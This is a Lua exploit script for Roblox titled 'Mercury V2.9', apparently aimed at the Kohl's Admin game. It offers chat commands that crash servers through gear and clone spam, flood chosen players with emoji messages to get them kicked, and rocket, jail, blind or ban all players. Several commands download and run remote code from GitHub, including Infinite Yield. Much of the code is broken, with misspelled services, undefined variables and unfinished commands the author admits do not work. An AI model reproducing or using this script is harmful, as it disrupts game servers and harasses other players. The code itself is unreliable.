--[[
Made By Python
Access Only Script
Guns.lol/person299
--]]


-- VARS
local lp = game.Players.LocalPlayer
local lpc = lp.Character
local char = lpc.Humanoid
local space = "n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
local plx = game.Players:GetPlayers()
local bannedgear = false
local bannedgears = {}
local banned = {}
local Kohls = game.Workspace.Terrain:WaitForChild("_Game")
local gojo = true
local prefix = "-"
local version = "Mercury V2.9"
local connections = {}
local RunService = game:GetService("RunService")
local joins = true
local autorun = {
    "antirocket",
    "antihat"
}

local function notify(msg, length)
    game.StarterGui:SetCore("SendNotification", {
            Title = "Mercury V2.9",
            Text = msg,
            Duration = length
    })
end

local function fcrash()
    for i = 1,100 do
        chat("freeze all all all")
        chat("clone all all all")
    end
end

local antirocket

task.spawn(function() -- haven't tested yet.
    connections.antirocket = RunService.RenderStepped:Connect(function()
        game.Workspace.Descendants.ChildAdded:Connect(function(v)
            wait()
            if v.Name == "Rocket" then
                v:Destroy()
            end
        end)
    end)
end)

wait()

local function fixfilter()
    for i = 1,100 do
        chat("(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)")
    end
    wait(0.3)
    for i = 1,100 do
              chat("(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!(!)")
    end
    wait(0.3)
    chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n-------------------------\nFix Ur Goofy Filter RoadBlocks\n-------------------------")
end

local function clearlogs()
    for i = 1,100 do
        chat("*(*&@*_($&_(&$!^$_(!@^$_(!@^$(*^@$!")
    end
end

task.spawn(function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/TheGodE6/Solar/refs/heads/main/mercury%20whitelist"))()
end)

function chat(msg)
    game.Players:Chat(msg)
end

local function getplayer(p)
	for i, v in game.Players:GetPlayers() do
		if script.sub(v.Name:lower(), 1, #p) or string.sub(v.DisplayName:lower(), 1, #p) == p:lower() then
			  return v
    elseif p == "me" then
        return lp
    elseif p == "all" then
        return game.Players:GetPlayers()
    end
	end
end

if getgenv().roblox then
    return
end

getgenv().roblox = true

local function vgcrash()
    chat("gear me 94794847")
    repeat wait() until lp.Backpack:WaitForChild("VampireVanquisher")
    local vg = lp.Backpack:FindFirstChild("VampireVanquisher")
    vg.Parent = char
    wait(0.3)
    for i = 1,100 do
        chat("unsize me")
    end
end

task.spawn(function() -- whitelist
    for i,v in pairs(plx) do
        v.Chatted:Connect(function(msg)
            if table.find(whitelist, v.Name) then
                 if msg[1] == prefix then
                    chat(msg)
                 end
            end
        end)
    end
end)

task.spawn(function()
    for i,v in pairs(plx) do
        task.wait()
        while bannedgear do
          v.Backpack.ChildAdded:Connect(function(gear)
            if table.find(bannedgears, gear.Name) then
                for i = 1,10 do
                    chat("ungear "..v.Name)
                end
            end
          end)
        end
    end
end)

function addcmd(info)
    local CommandName = info.Name
    local CommandFunction = info.Func 
    connections[#connections + 1] = lp.Chatted:Connect(function(msg)
        args = msg:split(" ")
        if args[1] == prefix .. CommandName then
            CommandFunction()
        end
    end)
end

addcmd({
    Name = "emergencycommand",
    Func = function()
        for i = 1,100 do
          chat("-ban all")
          chat("blind all")
          chat("fogend")
          chat("explode all")
        end
        fcrash()
    end
})

addcmd({
    Name = "antihat",
    Func = function()
        connections.antihat = RunService.RenderStepped:Connect(function()
            wait()
            game.Workspace.Descendants.ChildAdded:Connect(function(v)
                if v:IsA("Acessory") and v.Name == "Accessory (Arrow)" then
                    v:Destroy()
                end
            end)
        end)
    end
})

addcmd({
    Name = "unantihat",
    Func = function()
        connections.antihat:Disconnect()
    end
})

addcmd({
    Name = "gban",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        chat("gear me 1665990")
        repeat wait() until lp.Backpack:WaitChild("PortableJustice")
        local gb = lp.Backpack:FindFirstChild("PortableJustice")
        local oldpos = char.CFrame
        char.CFrame = plr.Character.Humanoid.CFrame
        gb.Parent = char
        gb.MouseClick:FireServer(plr)
        chat("freeze "..v.Name)
        wait(1.3)
        char.CFrame = oldpos
        chat("ungear me")
end
})

addcmd({
    Name = "fixfilter",
    Func = function()
        fixfilter()
    end
})

addcmd({  --- i know this doesnt work.
    Name = "anticrash",
    Func = function()
        game.Players.Backpack.ChildAdded:Connect(function(v) -- what is this supposed to do? this would remove the vg from you only
            if v.Name == "VampireVanquisher" then
                v:Destroy()
                chat("ungear "..v.Name)
            end
        end)
    end
})

addcmd({
    Name = "pmkick",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        getgenv().pmkick = true
        while pmkick do
            chat("pm "..plr.Name.." 😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚😚")
        end
    end
})

addcmd({
    Name = "unpmkick",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        getgenv().pmkick = false
    end
})

addcmd({
    Name = "k1",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        chat("respawn "..plr.Name)
        wait(0.2)
        chat("jail/"..plr.Name)
        chat("speed "..plr.name.." 0")
        chat("setgrav "..plr.Name.." 1000")
        rkicker = RunService.RenderStepped:Connect(function()
        char.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0) * CFrame.new(0,0,-2)
        chat("rocket/me/me/me")
        chat("rocket/"..plr.Name.."/"..plr.Name.."/"..plr.Name)
        wait()
        end)
    end
})

addcmd({
    Name = "skick",
    Func = function()
        chat("respawn me")
        rkicker:Disconnect()
    end
})

addcmd({
   Name = "antikill",
   Func = function()
    local plr = args[2]
    getplayer(plr)
    connections["_Antikill "..plr.Name] =
        plr.CharacterAdded:Connect(function(c)
            c:WaitForChild("Humanoid").Died.Once:Connect(function()
                chat("reset "..v.Name.." fuck fuck")
            end)
        end)
   end
})

addcmd({
    Name = "unantikill",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Antikill "..plr.Name]:Disconnect()
        connections["_Antikill "..plr.Name] = nil
    end
})

addcmd({
    Name = "gearpack",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        chat("gear "..plr.Name.." 11419319")
        chat("gear "..plr.Name.." 121946387")
        chat("gear "..plr.Name.." 212641536")
        chat("gear "..plr.Name.." 212641536")
        chat("gear "..plr.Name.." 116693764")
        chat("gear "..plr.Name.." 12187348")
        chat("pm "..plr.Name.." You Have Just Been Gaven An Elitr Gear Pack!")
    end
})

local iy
addcmd({
    Name = "iy",
    Func = function()
        notify("Infinite Yield Loaded!")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
})

addcmd({
    Name = "cmds",
    Func = function()
        print("-- List of Mercury Commands --")
        print("\n")
        print("\n")
        print("\n")
        print("\n")
        print("antikill -- self explainatory")
        print("k2 -- hatkick")
        print("gban -- gearban someone using portablejuice")
        print("k1 - rocket kick -- bad dont use")
        print("antigear - stops everyone using gears")
        print("antirocket - antirocket")
        print("vgcrash - crash server using VampireVanquisher")
        print("dummy - spawns a dummy")
        print("autogod - u never die basically")
        print("unloadscript - stops commands.")
        print("ban - bans a user")
        print("gearpack [user] - give someone a gearpack")
        print("iy - load infinite yield")
        print("spam [arg2] - spam whatever u desire")
        print("Venus - old mercury")
        print("pmkick - kicks a user using the good old kick")
        print("\n")
        print("Created by Python")
    end
})

addcmd({ -- idk when im finishing dis to lazy
    Name = "k2",
    Func = function()
        local plr = args[2]
        getplayer(plr)
    end
})


addcmd({
    Name = "furrify",  --- unfinished to lazy
    Func = function()
        local plr = args[2]
        getplayer(plr)
        chat("unhat "..plr.name)
        chat("unshirt "..plr.Name)
        chat("removepants "..plr.Name)
        chat("hat "..plr.Name.." 14544320451")
    end
})

addcmd({
    Name = "Venus",  -- shit ass dont use pls unless ur a tester
    Func = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TheGodE6/Solar/refs/heads/main/Venus.lua"))()
    end
})

addcmd({ -- finishing soon
    Name = "autoheal",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Autoheal "..plr.Name] = 
          RunService.RenderStepped:Connect(function()
            if plr.Character.Humanoid.Health ~= 100 then
              chat("heal "..plr.Name.." 100 fuck fuck")
            end
          end)
    end
})

addcmd({
    Name = "unautoheal",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Autoheal "..plr.Name]:Disconnect()
    end
})


addcmd({
    Name = "vgc",
    Func = function()
        vgcrash()
    end
})

addcmd({
    Name = "antigear",
    Func = function()
        bannedgear = true
    end
})

addcmd({
    Name = "unantigear",
    Func = function()
        bannedgear = false
    end
})

addcmd({
    Name = "antirocket",
    Func = function()
        antirocket = true
    end
})

addcmd({
    Name = "unantirocket",
    Func = function()
        antirocket = false
    end
})

addcmd({
    Name = "antipunish",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Antipunish "..plr.Name] = 
          RunService.RenderStepped:Connect(function()
            if game:GetService("Lighting"):FindFirstChild(plr.Name) then
                if table.find(antipunished, plr.Name) then
                chat("unpunsh "..plr.Name)
                end
            end
          end)
    end
})

addcmd({
    Name = "unantipunish",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Antipunish "..plr.Name]:Disconnect()
    end
})

addcmd({
    Name = "lock",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Lock "..plr.Name] = 
          plr.CharacterAdded:Connect(function(c)
            wait()
            if not game:GetService("Lighting"):FindFirstChild(plr.Name) then
                chat("punish "..plr.Name)
                chat("blind "..plr.Name)
            end
          end)
end
})

addcmd({  --- getting api soon
    Name = "findgear",
    Func = function()
    end
})

addcmd({
    Name = "unban",
    Func = function()
    local plr = args[2]
        getplayer(plr)
        connections["_Lock "..plr.Name]:Disconnect()
    end
})

addcmd({
    Name = "autogod",
    Func = function()
        local plr = args[2]
        getplayer(plr)
        connections["_Autogod "..plr.Name] = 
          RunService.Hearbeat:Connect(function()
            if plr.Character.Humanoid.Health ~= inf then
              chat("god "..plr.Name)
            end
          end)
end
})

addcmd({
    Name = "gojo!on",
    Func = function()
        gojo = true
    end
})

addcmd({  --- not finished
    Name = "purple",
    Func = function()
        if gojo then
            chat("m test")
        end
    end
})

addcmd({
    Name = "gojo!off",
    Func = function()
        gojo = false
    end
})

addcmd({
    Name = "dummy",
    Func = function()
        local oldpos = char.CFrame
        chat("clone me")
        wait(0.1)
        chat("respawn me")
        char.CFrame = oldpos
    end
        
})

addcmd({  -- this just unloads the commands :D
    Name = "unloadscript",
    Func = function()
        for i,v in pairs(connections) do
            v:Disconnect()
        end
    end
})

addcmd({
    Name = "nok",
    Func = function()
        for i,v in pairs(Kohls.Workspace.Obby:GetChildren()) do
            v.CanTouch = false
            v.CanCollide = false
          end
    end
})

addcmd({
    Name = "vis",
    Func = function()
        visc()
    end
})


addcmd({
    Name = "Fcrash",
    Func = function()
        fcrash()
    end
})

addcmd({
    Name = "spam",
    Func = function()
        local spamm = args[2]
        spamcommand = RunSerivce.RenderStepped:Connect(function()
            chat(spamm)
            wait()
        end)
    end
})

addcmd({
    Name = "unspam",
    Func = function()
        spamcommand:Disconnect()
    end
})

task.spawn(function()
    game.Players.PlayerAdded:Connect(function(v)
        if joins then
        chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nUsername: "..player.Name.."\n DisplayName: "..player.DisplayName.."\nAge: "..player.AccountAge.."\nWelcome!")
        end
    end)
end)

local time = tick()
task.spawn(function()
if game:IsLoaded() then
    chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Mercury🪐 "..version.." Loaded in "..math.floor((tick() - time) * 1000).." ms")
    notify("Mercury🪐 "..version.." loaded in "..math.floor((tick() - time) * 1000).." ms")
end
end)

task.spawn(function()
    game.Players.PlayerAdded:Connect(function(v)
        if table.find(banned, v.Name) then
            chat("-ban "..v.Name)
        end
    end)
end)

--//autorun
for _,v in pairs(autorun) do
    chat(v)
end
